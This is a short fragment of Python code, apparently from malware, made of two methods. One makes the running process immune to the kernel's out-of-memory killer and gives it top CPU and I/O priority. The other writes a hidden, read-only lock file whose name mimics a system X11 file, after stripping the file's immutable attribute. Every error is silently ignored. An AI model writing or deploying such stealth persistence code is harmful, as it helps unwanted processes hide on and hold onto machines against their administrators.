    def _set_resource_priority(self):
        pid = os.getpid()
        try:
            with open(f"/proc/{pid}/oom_score_adj", "w") as f: f.write("-1000")
            if hasattr(os, 'nice'): os.nice(-20)
            subprocess.run(["ionice", "-c", "1", "-p", str(pid)], capture_output=True, check=False)
        except: pass

    def _create_shadow_lock(self):
        lock_path = "/dev/shm/.X11-unix-lock"
        try:
            if os.path.exists(lock_path): subprocess.run(["chattr", "-i", lock_path], stderr=subprocess.DEVNULL)
            with open(lock_path, "w") as f: f.write(str(os.getpid()))
            os.chmod(lock_path, 0o444)
        except: pass

